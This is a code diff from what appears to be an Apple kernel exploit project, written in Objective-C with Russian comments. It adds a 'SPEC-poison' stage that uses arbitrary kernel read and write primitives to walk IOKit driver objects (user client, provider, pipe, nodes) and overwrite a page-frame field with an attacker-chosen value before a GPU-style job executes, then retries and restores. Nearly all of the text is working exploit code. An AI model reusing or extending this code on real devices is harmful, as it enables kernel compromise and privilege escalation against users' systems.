@@ -6753,6 +6753,46 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     *(uint64_t *)(tsdV + 8) = 1;   // async
     kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
     kpNote(r, [NSString stringWithFormat:@"  victim#1 async submit (real src): kr=0x%x — mapping кэшируется на pipe", avkr]);
+    // 1.9.222: SPEC-яд — голый pfn32 по +0x58 = ranges-spec rewriter'а (р.52:
+    // ldr w8,[x22,#0x58] → desc+0x9c). Выигрыш 1.9.207 = именно он. Резолвим
+    // pipe СРАЗУ после submit (спек создан маппингом) и отравляем ДО первого
+    // execute — rewriter сам скопирует ctlPFN. Zone-объекты, без лотерей.
+    uint64_t specVA[8], specOld[8];
+    int nSpec = 0;
+    {
+        uint64_t vcS = kpM2TClientVA(r, isTable, victim, @"spc-victim");
+        uint64_t ucS = kpLooksLikeKernelPointer(vcS) ? kp_untag_ptr(early_kread64(vcS + 0x30)) : 0;
+        uint64_t provS = kpLooksLikeKernelPointer(ucS) ? kp_untag_ptr(early_kread64(ucS + 0xe8)) : 0;
+        uint64_t maskS = kpLooksLikeKernelPointer(provS) ? early_kread64(provS + 0x180) : 0;
+        int piS = -1;
+        for (int b = 0; b < 8; b++) if (maskS & (1ULL << b)) { piS = b; break; }
+        uint64_t pipeS = (piS >= 0) ? kp_untag_ptr(early_kread64(provS + 0x140 + (uint64_t)piS * 8)) : 0;
+        uint64_t nodeS = kpLooksLikeKernelPointer(pipeS) ? kp_untag_ptr(early_kread64(pipeS + 0x178)) : 0;
+        kpNote(r, [NSString stringWithFormat:@"  [SPC] UC=%#llx prov=%#llx pipe=%#llx node=%#llx",
+                  (unsigned long long)ucS, (unsigned long long)provS, (unsigned long long)pipeS, (unsigned long long)nodeS]);
+        for (uint32_t ni = 0; ni < 8 && kpLooksLikeKernelPointer(nodeS) && kpSafeToRead(nodeS) && nSpec < 8; ni++) {
+            for (uint32_t o = 0; o + 8 <= 0xa0 && nSpec < 8; o += 8) {
+                uint64_t Q = kp_untag_ptr(early_kread64(nodeS + o));
+                if (!kpLooksLikeKernelPointer(Q) || !kpSafeToRead(Q)) continue;
+                uint64_t v = early_kread64(Q + 0x58);
+                if ((uint32_t)v != pfn32) continue;
+                uint64_t nq = (v & 0xffffffff00000000ULL) | ctlPFN;
+                kpNote(r, [NSString stringWithFormat:@"    [SPC] ★ spec: node[%u]+%#x → %#llx+0x58: %#018llx → %#018llx",
+                          ni, o, (unsigned long long)Q, (unsigned long long)v, (unsigned long long)nq]);
+                usleep(2000);
+                early_kwrite64(Q + 0x58, nq);
+                uint64_t rb = early_kread64(Q + 0x58);
+                kpNote(r, [NSString stringWithFormat:@"        readback: %#018llx — %@", (unsigned long long)rb, rb == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                specVA[nSpec] = Q + 0x58; specOld[nSpec] = v; nSpec++;
+            }
+            uint64_t nx = kp_untag_ptr(early_kread64(nodeS + 0x20));
+            if (!kpLooksLikeKernelPointer(nx) || nx == nodeS) nx = kp_untag_ptr(early_kread64(nodeS + 0x10));
+            if (!kpLooksLikeKernelPointer(nx) || nx == nodeS) nx = kp_untag_ptr(early_kread64(nodeS + 0x8));
+            if (!kpLooksLikeKernelPointer(nx) || nx == nodeS) break;
+            nodeS = nx;
+        }
+        if (!nSpec) kpNote(r, @"  [SPC] spec+0x58 с pfn32 в нодах не найден — ждём memo агента");
+    }
     // 1.9.147: OP-ENTRY ОРАКУЛ — surfVA из самой оп-записи scheduler'а, без портов
     // и реестра. Submit (sel1) резолвит surface ptr в op-entry (раунд 24); нашу
     // запись находим по credit=0x10 (sel10 выше), сканируем 0x21c0 на указатели,
@@ -7063,6 +7103,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // только в окне execute, не секундами — урок prev-12).
     for (int attempt = 1; !changed && attempt < 4; attempt++) {
         for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], newQs[j]);
+        for (int k = 0; k < nSpec; k++) early_kwrite64(specVA[k], (specOld[k] & 0xffffffff00000000ULL) | ctlPFN);
         for (int i = 0; i < nDep; i++) {
             if (hitForm[i] < 0 || hitForm[i] == 4) continue;
             uint64_t nq = (hitForm[i] == 1) ? ((hitOld[i] & 0x3fffULL) | ctlPA)
@@ -7082,6 +7123,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         if (!changed) {
             for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], origQs[j]);
             for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
+            for (int k = 0; k < nSpec; k++) early_kwrite64(specVA[k], specOld[k]);
         }
     }
     // restore всех пропатченных слотов (порт-маршрут или одиночный ranges)
@@ -7089,6 +7131,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         early_kwrite64(slotVAs[j], origQs[j]);
     // 1.9.219: финальный restore DEP-хитов ВСЕГДА (яд не живёт дольше теста)
     for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
+    // 1.9.222: финальный restore spec (яд не живёт дольше теста)
+    if (!changed) for (int k = 0; k < nSpec; k++) early_kwrite64(specVA[k], specOld[k]);
     // 1.9.198: restore VA-поля буфера (teardown-safety)
     if (vaFldObj) {
         early_kwrite64(vaFldObj + vaFldOff, vaFldOld);
